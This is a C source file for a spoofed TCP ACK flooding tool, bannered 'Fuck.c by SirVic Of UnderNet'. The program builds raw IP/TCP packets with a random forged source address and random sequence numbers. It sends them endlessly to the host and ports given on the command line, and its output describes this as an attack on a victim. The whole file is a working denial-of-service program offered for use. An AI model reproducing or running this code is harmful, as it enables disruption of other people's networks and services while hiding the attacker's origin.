#include <signal.h>
#include <stdio.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

int ports, s, i;

char *dsthost;
unsigned long dst;
unsigned long portarray[255];

void
abort (void)
{
   printf (":: Exiting...\n\n");
   close (s);
   exit (0);
}

void
banner (void)
{
   printf ("-------------------------------------\n");
   printf (":: Fuck.c by SirVic Of UnderNet =) ::\n");
   printf ("-------------------------------------\n");
}

void
usage (char *progname)
{
   printf ("Usage: %s <dst> <ports>\n", progname);
   printf ("\t<dst>   - Destination host\n");
   printf ("\t<ports> - Ports to flood\n\n");
   exit (1);
}

void
parse_args (int argc, char *argv[])
{
   dsthost = argv[1];
   for (i = 2; i < argc; i++)
     {
       ports++;
       portarray[ports] = atoi (argv[i]);
     }
}

unsigned long
resolve_host (char *h)
{
   struct hostent *host;
   if ((host = gethostbyname (h)) == NULL)
     {
       printf (":: unknown host %s\n", h);
       exit (1);
     }
   return *(unsigned long *) host->h_addr;
}

/* stolen from ping.c */
unsigned short
in_cksum (u_short * addr, int len)
{
   register int nleft = len;
   register u_short *w = addr;
   register int sum = 0;
   u_short answer = 0;
   while (nleft > 1)
     {
       sum += *w++;
       nleft -= 2;
     }
   if (nleft == 1)
     {
       *(u_char *) (&answer) = *(u_char *) w;
       sum += answer;
     }
   sum = (sum >> 16) + (sum & 0xffff);
   sum += (sum >> 16);
   answer = ~sum;
   return (answer);
}

void
send_tcp_segment (struct iphdr *ip, struct tcphdr *tcp, char *data, int dlen)
{
   char buf[65536];
   struct
     {
       unsigned long saddr;
       unsigned long daddr;
       char mbz;
       char proto;
       unsigned short tcplength;
     }
   ph;
   struct sockaddr_in sin;
   ph.saddr = ip->saddr;
   ph.daddr = ip->daddr;
   ph.mbz = 0;
   ph.proto = IPPROTO_TCP;
   ph.tcplength = htons (sizeof (*tcp) + dlen);
   memcpy (buf, &ph, sizeof (ph));
   memcpy (buf + sizeof (ph), tcp, sizeof (*tcp));
   memcpy (buf + sizeof (ph) + sizeof (*tcp), data, dlen);
   memset (buf + sizeof (ph) + sizeof (*tcp) + dlen, 0, 4);

   tcp->check = in_cksum ((u_short *) buf, (sizeof (ph) + sizeof (*tcp) + 
dlen + 1) & ~1);

   memcpy (buf, ip, 4 * ip->ihl);
   memcpy (buf + 4 * ip->ihl, tcp, sizeof (*tcp));
   memcpy (buf + 4 * ip->ihl + sizeof (*tcp), data, dlen);
   memset (buf + 4 * ip->ihl + sizeof (*tcp) + dlen, 0, 4);

   ip->check = in_cksum ((u_short *) buf, (4 * ip->ihl + sizeof (*tcp) + 
dlen + 1) & ~1);

   memcpy (buf, ip, 4 * ip->ihl);
   sin.sin_family = AF_INET;
   sin.sin_port = tcp->dest;
   sin.sin_addr.s_addr = ip->daddr;
   if (sendto (s, buf, 4 * ip->ihl + sizeof (*tcp) + dlen, 0, &sin, sizeof 
(sin)) < 0)
     {
       perror (":: Error: sending syn packet");
       exit (1);
     }
}

int
main (int argc, char *argv[])
{
   struct iphdr ip;
   struct tcphdr tcp;
   struct timeval tv;
   struct sockaddr_in sin;
   int blah = 1;

   signal (SIGINT, (void (*)()) abort);

   banner ();

   if (argc < 3)
     usage (argv[0]);

   parse_args (argc, argv);

   dst = resolve_host (dsthost);

   srand (time (NULL));

   printf (":: Destination host - %s\n", dsthost);
   printf (":: Destination port(s)");
   for (i = 1; i < ports + 1; i++)
     printf (" - %d", portarray[i]);
   printf ("\n");

   if ((s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
     {
       perror (":: Error: can not open socket");
       exit (1);
     }

   if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, (char *) &blah, sizeof 
(blah)) < 0)
     {
       perror (":: setsockopt");
       exit (1);
     }
   ip.version = 4;
   ip.ihl = 5;
   ip.tos = 0x8;
   ip.frag_off = 0;
   ip.ttl = 255;
   ip.protocol = IPPROTO_TCP;
   ip.check = 0;
   ip.daddr = dst;
   tcp.res1 = 0;
   tcp.fin = 0;
   tcp.syn = 0;
   tcp.rst = 0;
   tcp.psh = 0;
   /* make it an ACK packet */
   tcp.ack = 1;
   tcp.urg = 0;
   tcp.res2 = 0;
   tcp.urg_ptr = 0;
   printf (":: Slashing SirVic's server on victim...\n");
   printf (":: Press ^C to end attack...\n");
   for (;;)
     {
       for (i = 1; i < ports + 1; i++)
	{
	  ip.saddr = rand ();
	  ip.tot_len = sizeof (ip) + sizeof (tcp);
	  ip.id = htons (random ());
	  tcp.source = htons (1024 + rand () % 32000);
	  tcp.dest = htons (portarray[i]);
	  /* randomize seq */
	  tcp.seq = random ();
	  tcp.doff = sizeof (tcp) / 4;
	  tcp.window = htons (16384);
	  /* randomize ack */
	  tcp.ack_seq = random ();
	  send_tcp_segment (&ip, &tcp, "", 0);
	}
     }
   return 1;
}

